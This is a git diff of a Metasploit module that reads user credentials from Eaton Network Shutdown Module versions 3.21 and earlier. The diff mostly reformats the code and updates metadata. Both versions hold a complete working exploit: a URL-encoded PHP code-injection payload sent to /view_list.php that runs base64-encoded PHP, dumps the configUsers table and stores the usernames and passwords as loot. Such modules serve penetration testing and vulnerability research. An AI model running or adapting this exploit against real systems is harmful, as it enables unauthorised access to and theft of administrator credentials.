@@ -1,55 +1,59 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Network Shutdown Module sort_values Credential Dumper',
-      'Description'    => %q{
-        This module will extract user credentials from Network Shutdown Module
-        versions 3.21 and earlier by exploiting a vulnerability found in
-        lib/dbtools.inc, which uses unsanitized user input inside a eval() call.
-        Please note that in order to extract credentials,the vulnerable service
-        must have at least one USV module (an entry in the "nodes" table in
-        mgedb.db).
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Network Shutdown Module sort_values Credential Dumper',
+        'Description' => %q{
+          This module will extract user credentials from Network Shutdown Module
+          versions 3.21 and earlier by exploiting a vulnerability found in
+          lib/dbtools.inc, which uses unsanitized user input inside a eval() call.
+          Please note that in order to extract credentials, the vulnerable service
+          must have at least one USV module (an entry in the "nodes" table in
+          mgedb.db).
+        },
+        'References' => [
           ['OSVDB', '83199'],
-          ['URL', 'http://secunia.com/advisories/49103/']
+          ['URL', 'https://web.archive.org/web/20121014000855/http://secunia.com/advisories/49103/']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'h0ng10',
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Jun 26 2012"
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-06-26',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(4679)
-      ], self.class)
+      ]
+    )
   end
 
   def execute_php_code(code, opts = {})
     param_name = Rex::Text.rand_text_alpha(6)
-    padding    = Rex::Text.rand_text_alpha(6)
-    php_code   = Rex::Text.encode_base64(code)
-    url_param  = "#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f"
+    padding = Rex::Text.rand_text_alpha(6)
+    php_code = Rex::Text.encode_base64(code)
+    url_param = "#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f"
 
     res = send_request_cgi(
       {
-        'uri'   =>  '/view_list.php',
+        'uri' => '/view_list.php',
         'method' => 'POST',
         'vars_get' =>
           {
@@ -63,14 +67,15 @@ class MetasploitModule < Msf::Auxiliary
           {
             'Connection' => 'Close'
           }
-        })
+      }
+    )
     res
   end
 
   def read_credentials
-    pattern   = Rex::Text.rand_text_numeric(10)
+    pattern = Rex::Text.rand_text_numeric(10)
     users_var = Rex::Text.rand_text_alpha(10)
-    user_var  = Rex::Text.rand_text_alpha(10)
+    user_var = Rex::Text.rand_text_alpha(10)
     php = <<-EOT
     $#{users_var} = &queryDB("SELECT * FROM configUsers;");
     foreach($#{users_var} as $#{user_var}) {
@@ -99,8 +104,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'Network Shutdown Module Credentials',
-      'Indent'  => 1,
+      'Header' => 'Network Shutdown Module Credentials',
+      'Indent' => 1,
       'Columns' => ['Username', 'Password']
     )
 
@@ -111,11 +116,11 @@ class MetasploitModule < Msf::Auxiliary
     print_line
     print_line(cred_table.to_s)
 
-    loot_name     = "eaton.nsm.credentials"
-    loot_type     = "text/csv"
+    loot_name = "eaton.nsm.credentials"
+    loot_type = "text/csv"
     loot_filename = "eaton_nsm_creds.csv"
-    loot_desc     = "Eaton Network Shutdown Module Credentials"
+    loot_desc = "Eaton Network Shutdown Module Credentials"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], cred_table.to_csv, loot_filename, loot_desc)
-    print_status("Credentials saved in: #{p.to_s}")
+    print_good("Credentials saved in: #{p.to_s}")
   end
 end
